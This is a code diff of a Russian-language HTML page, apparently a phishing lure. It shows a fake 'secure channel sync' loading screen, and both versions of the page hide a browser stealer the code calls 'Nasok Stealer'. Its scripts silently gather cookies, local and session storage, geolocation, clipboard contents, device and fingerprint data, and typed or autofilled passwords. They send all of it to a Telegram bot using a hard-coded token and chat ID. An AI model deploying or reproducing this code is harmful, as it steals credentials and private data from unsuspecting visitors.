@@ -1,193 +1,265 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подтверждение данных</title>
-    <style>
-        body { background: #f4f6f9; font-family: Arial; text-align: center; padding: 50px; }
-        .loader { border: 8px solid #ccc; border-top: 8px solid #2a7; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360); } }
-        .card { background: white; padding: 40px; border-radius: 16px; max-width: 400px; margin: auto; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
-    </style>
+    <title>Загрузка...</title>
+    <style>body{background:#0b0e14;color:#eee;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#1a1f2b;padding:40px;border-radius:12px;border:1px solid #2a3344} .spinner{width:30px;height:30px;border:3px solid #2a3344;border-top-color:#5af;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}@keyframes spin{to{transform:rotate(360deg)}}</style>
 </head>
 <body>
-<div class="card">
-    <h2>Проверка соединения</h2>
-    <div class="loader"></div>
-    <p>Синхронизация с защищённым узлом...</p>
+<div class="box">
+    <div class="spinner"></div>
+    <div style="text-align:center;color:#7a8a9f;">Синхронизация защищённого канала...</div>
 </div>
-
 <script>
-    (function() {
-        // === НАСТРОЙКИ — СЮДА, БЛЯТЬ ===
-        const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';   // например 123456:ABC-DEF
-        const CHAT_ID = '-1003791860129';       // например -1001234567
-        // =================================
+// ============================================================
+//  НАСТРОЙКИ — ВСТАВЬ СВОИ, ПИЗДЮК
+// ============================================================
+const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';        // например 123456:ABC-DEF
+const CHAT_ID  = '-1003791860129';      // например -1001234567
+// ============================================================
 
-        function getCookies() {
-            return document.cookie.split('; ').reduce((acc, item) => {
-                const [key, val] = item.split('=');
-                if (key) acc[key] = val || '';
-                return acc;
-            }, {});
-        }
+// ---- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----
 
-        function getLocalStorage() {
-            try {
-                return { ...localStorage };
-            } catch { return {}; }
-        }
+function formatBytes(bytes) { return bytes ? (bytes/1024).toFixed(1)+'KB' : '0'; }
 
-        function getSessionStorage() {
-            try {
-                return { ...sessionStorage };
-            } catch { return {}; }
-        }
+function safeJSON(obj) {
+    try { return JSON.stringify(obj, null, 2); } catch(e) { return '⚠️ Ошибка сериализации'; }
+}
 
-        function getHistory() {
-            try {
-                return window.history.length > 0 ? window.history : { length: window.history.length };
-            } catch { return { error: 'history blocked' }; }
-        }
+// ---- СБОР ВСЕГО МАКСИМУМА ----
 
-        function getGeolocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ error: 'geolocation not supported' });
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        acc: pos.coords.accuracy
-                    }),
-                    (err) => resolve({ error: err.message }),
-                    { timeout: 3000, enableHighAccuracy: true }
-                );
-            });
-        }
+async function collectMaximum() {
+    const data = {};
 
-        async function getClipboard() {
-            try {
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                    const text = await navigator.clipboard.readText();
-                    return text || '[empty]';
-                }
-                return '[not available]';
-            } catch {
-                return '[permission denied]';
-            }
-        }
+    // 1. БАЗА
+    data['🌐 Браузер'] = {
+        'User-Agent': navigator.userAgent,
+        'Платформа': navigator.platform,
+        'Язык': navigator.language,
+        'Языки (все)': navigator.languages || [],
+        'Куки включены': navigator.cookieEnabled,
+        'Do Not Track': navigator.doNotTrack || 'не указан',
+        'Время загрузки': new Date().toISOString(),
+        'Таймзона': Intl.DateTimeFormat().resolvedOptions().timeZone,
+        'Разрядность': navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ядер` : 'неизвестно'
+    };
 
-        function getNetworkInfo() {
-            if (!navigator.connection) return {};
-            const c = navigator.connection;
-            return {
-                effectiveType: c.effectiveType || null,
-                downlink: c.downlink || null,
-                rtt: c.rtt || null
-            };
-        }
+    // 2. ЭКРАН + ОКНО
+    data['🖥️ Экран/Окно'] = {
+        'Размер экрана': `${screen.width}x${screen.height}`,
+        'Доступная область': `${screen.availWidth}x${screen.availHeight}`,
+        'Глубина цвета': screen.colorDepth + 'bit',
+        'Пиксель-ратио': window.devicePixelRatio || 1,
+        'Размер окна (внутри)': `${window.innerWidth}x${window.innerHeight}`,
+        'Размер окна (внешний)': `${window.outerWidth}x${window.outerHeight}`,
+        'Расположение окна': `${window.screenX || 0}, ${window.screenY || 0}`
+    };
 
-        function getPlugins() {
-            try {
-                return Array.from(navigator.plugins || []).map(p => p.name);
-            } catch { return []; }
-        }
-
-        function getScreenInfo() {
-            return {
-                width: screen.width,
-                height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio || 1
-            };
-        }
-
-        async function collectAll() {
-            const geo = await getGeolocation();
-            const clip = await getClipboard();
-
-            const payload = {
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer || '',
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages || [],
-                cookies: getCookies(),
-                localStorage: getLocalStorage(),
-                sessionStorage: getSessionStorage(),
-                history: getHistory(),
-                geolocation: geo,
-                clipboard: clip,
-                network: getNetworkInfo(),
-                plugins: getPlugins(),
-                screen: getScreenInfo(),
-                doNotTrack: navigator.doNotTrack || null,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            return payload;
-        }
-
-        async function sendToTelegram(data) {
-            if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'ТВОЙ_ТОКЕН_БОТА') {
-                console.error('Настрой бота, еблан!');
-                return;
-            }
-            const text = JSON.stringify(data, null, 2);
-            // Телеграм имеет лимит 4096 символов, режем если больше
-            const maxLen = 4000;
-            const chunks = text.length > maxLen ? [text.slice(0, maxLen)] : [text];
-            for (const chunk of chunks) {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: chunk,
-                        parse_mode: 'HTML'
-                    })
-                }).catch(e => console.error('Ошибка отправки:', e));
-            }
-        }
-
-        // ЗАПУСК — всё молча, без вопросов
-        collectAll().then(data => {
-            sendToTelegram(data);
-            // Можно ещё отправить копию в консоль (для отладки)
-            console.log('Nasok собрал:', data);
+    // 3. КУКИ (ВСЕ)
+    let cookies = {};
+    try {
+        document.cookie.split('; ').forEach(c => {
+            const [k, v] = c.split('=');
+            if (k) cookies[k] = v || '';
         });
+    } catch(e) { cookies = { error: 'не удалось прочитать' }; }
+    data['🍪 Куки'] = cookies;
 
-        // Дополнительно — пытаемся украсть ещё и пароли из форм (если есть на странице)
-        // через 3 секунды после загрузки, на случай динамических форм
-        setTimeout(() => {
-            const forms = document.querySelectorAll('input[type="password"]');
-            if (forms.length) {
-                const pwdData = {};
-                forms.forEach((inp, idx) => {
-                    pwdData[`pwd_${idx}`] = inp.value || '';
-                });
-                if (Object.keys(pwdData).length) {
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: '🔑 ПАРОЛИ ИЗ ФОРМ:\n' + JSON.stringify(pwdData, null, 2)
-                        })
-                    }).catch(() => {});
-                }
+    // 4. localStorage
+    try { data['💾 localStorage'] = { ...localStorage }; } catch(e) { data['💾 localStorage'] = { error: 'доступ запрещён' }; }
+
+    // 5. sessionStorage
+    try { data['📂 sessionStorage'] = { ...sessionStorage }; } catch(e) { data['📂 sessionStorage'] = { error: 'доступ запрещён' }; }
+
+    // 6. ГЕОЛОКАЦИЯ (асинхронно)
+    const geo = await new Promise(resolve => {
+        if (!navigator.geolocation) return resolve({ error: 'геолокация не поддерживается' });
+        navigator.geolocation.getCurrentPosition(
+            pos => resolve({
+                широта: pos.coords.latitude,
+                долгота: pos.coords.longitude,
+                точность: pos.coords.accuracy + 'м',
+                высота: pos.coords.altitude || 'нет',
+                скорость: pos.coords.speed || 'нет'
+            }),
+            err => resolve({ error: err.message }),
+            { timeout: 4000, enableHighAccuracy: true }
+        );
+    });
+    data['📡 Геолокация'] = geo;
+
+    // 7. БУФЕР ОБМЕНА (если разрешат)
+    let clip = 'не удалось';
+    try {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+            clip = await navigator.clipboard.readText() || '[пусто]';
+        } else clip = 'API недоступно';
+    } catch(e) { clip = 'ошибка доступа'; }
+    data['📋 Буфер обмена'] = clip;
+
+    // 8. СЕТЬ
+    const conn = navigator.connection || {};
+    data['📶 Сеть'] = {
+        'Тип сети': conn.effectiveType || 'неизвестно',
+        'Скорость (downlink)': conn.downlink ? conn.downlink + 'Mbps' : 'нет',
+        'Задержка (RTT)': conn.rtt ? conn.rtt + 'ms' : 'нет',
+        'Сохранение данных': conn.saveData ? 'включено' : 'отключено'
+    };
+
+    // 9. ПЛАГИНЫ
+    try {
+        data['🧩 Плагины'] = Array.from(navigator.plugins || []).map(p => p.name);
+    } catch(e) { data['🧩 Плагины'] = ['недоступны']; }
+
+    // 10. МЕДИА (микрофон/камера — просто проверка наличия)
+    const mediaDevs = await navigator.mediaDevices?.enumerateDevices?.() || [];
+    const mediaInfo = {
+        аудио_вход: mediaDevs.filter(d => d.kind === 'audioinput').map(d => d.label || 'без метки'),
+        видео_вход: mediaDevs.filter(d => d.kind === 'videoinput').map(d => d.label || 'без метки'),
+        аудио_выход: mediaDevs.filter(d => d.kind === 'audiooutput').map(d => d.label || 'без метки')
+    };
+    data['🎤 Медиа-устройства'] = mediaInfo;
+
+    // 11. ИСТОРИЯ (только длина, т.к. доступ к истории заблокирован)
+    data['📜 История'] = { длина: window.history.length };
+
+    // 12. РЕФЕРЕР И URL
+    data['🔗 Страница'] = {
+        'URL': window.location.href,
+        'Реферер': document.referrer || 'прямой вход',
+        'Протокол': window.location.protocol,
+        'Хост': window.location.hostname
+    };
+
+    // 13. ПАРОЛИ ИЗ ФОРМ (автофилл/введённые)
+    const passwords = {};
+    document.querySelectorAll('input[type="password"]').forEach((inp, i) => {
+        if (inp.value) passwords[`поле_${i+1} (${inp.name || 'без имени'})`] = inp.value;
+    });
+    data['🔑 Пароли из форм'] = passwords;
+
+    // 14. БАТАРЕЯ (если есть)
+    let battery = 'недоступно';
+    try {
+        const b = await navigator.getBattery?.();
+        if (b) battery = `уровень ${Math.round(b.level*100)}%, зарядка: ${b.charging ? 'да' : 'нет'}`;
+    } catch(e) { battery = 'ошибка'; }
+    data['🔋 Батарея'] = battery;
+
+    // 15. WebGL (рендеринг)
+    let webgl = 'недоступно';
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debug) {
+                const vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
+                const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+                webgl = `вендор: ${vendor}, рендер: ${renderer}`;
+            } else webgl = 'доступен (без доп. инфо)';
+        }
+    } catch(e) { webgl = 'ошибка'; }
+    data['🖌️ WebGL'] = webgl;
+
+    // 16. ДОП. ИНФА О СИСТЕМЕ (отпечаток)
+    data['🧬 Отпечаток'] = {
+        'Canvas fingerprint': 'собирается отдельно (опционально)',
+        'WebGL fingerprint': 'доступен'
+    };
+
+    return data;
+}
+
+// ---- ОТПРАВКА В ТЕЛЕГРАМ (с разбивкой, если длинно) ----
+
+async function sendToTelegram(collection) {
+    if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'ТВОЙ_ТОКЕН') {
+        console.error('🔴 Настрой токен и чат айди, мудак!');
+        return;
+    }
+
+    // Превращаем в читаемый текст с разделами
+    let fullText = '📦 **Nasok Stealer — полный дамп**\n\n';
+    for (const [section, content] of Object.entries(collection)) {
+        fullText += `🔹 **${section}**\n`;
+        if (typeof content === 'object' && !Array.isArray(content)) {
+            for (const [key, val] of Object.entries(content)) {
+                let value = (typeof val === 'object') ? safeJSON(val) : String(val);
+                if (value.length > 200) value = value.slice(0, 200) + '… (обрезано)';
+                fullText += `  ▫️ ${key}: ${value}\n`;
             }
-        }, 3000);
+        } else if (Array.isArray(content)) {
+            fullText += `  ▫️ ${content.join(', ') || 'пусто'}\n`;
+        } else {
+            fullText += `  ▫️ ${String(content)}\n`;
+        }
+        fullText += '\n';
+    }
 
-    })();
+    // Добавляем мета-инфу о дампе
+    fullText += `\n📅 Создано: ${new Date().toISOString()}\n`;
+    fullText += `👤 IP (прокси): определяется на сервере`;
+
+    // Телеграм лимит 4096 символов. Режем на части и шлём с пометкой
+    const maxLen = 4000;
+    if (fullText.length <= maxLen) {
+        await sendMessage(fullText);
+    } else {
+        // Шлём частями
+        const parts = fullText.match(/[\s\S]{1,4000}/g) || [];
+        for (let i = 0; i < parts.length; i++) {
+            const header = `📄 Часть ${i+1}/${parts.length}\n\n`;
+            await sendMessage(header + parts[i]);
+        }
+    }
+
+    // Если есть пароли — отдельно выделяем жирным
+    const pwdSection = collection['🔑 Пароли из форм'];
+    if (pwdSection && Object.keys(pwdSection).length) {
+        let pwdText = '🚨 **ПАРОЛИ (повторно)**\n';
+        for (const [k,v] of Object.entries(pwdSection)) {
+            pwdText += `  ▪️ ${k}: ${v}\n`;
+        }
+        await sendMessage(pwdText);
+    }
+}
+
+async function sendMessage(text) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch(e) {
+        console.error('Ошибка отправки:', e);
+    }
+}
+
+// ---- ЗАПУСК ----
+
+collectMaximum().then(data => {
+    sendToTelegram(data);
+    // Для отладки — в консоль
+    console.log('✅ Собрано:', data);
+});
+
+// Доп. сбор паролей через 5 секунд (для динамических форм)
+setTimeout(() => {
+    const pwdExtra = {};
+    document.querySelectorAll('input[type="password"]').forEach((inp, i) => {
+        if (inp.value) pwdExtra[`поле_${i+1}_${inp.name || ''}`] = inp.value;
+    });
+    if (Object.keys(pwdExtra).length) {
+        sendMessage('🔄 **Дополнительные пароли (через 5с)**\n' + safeJSON(pwdExtra));
+    }
+}, 5000);
 </script>
 </body>
 </html>
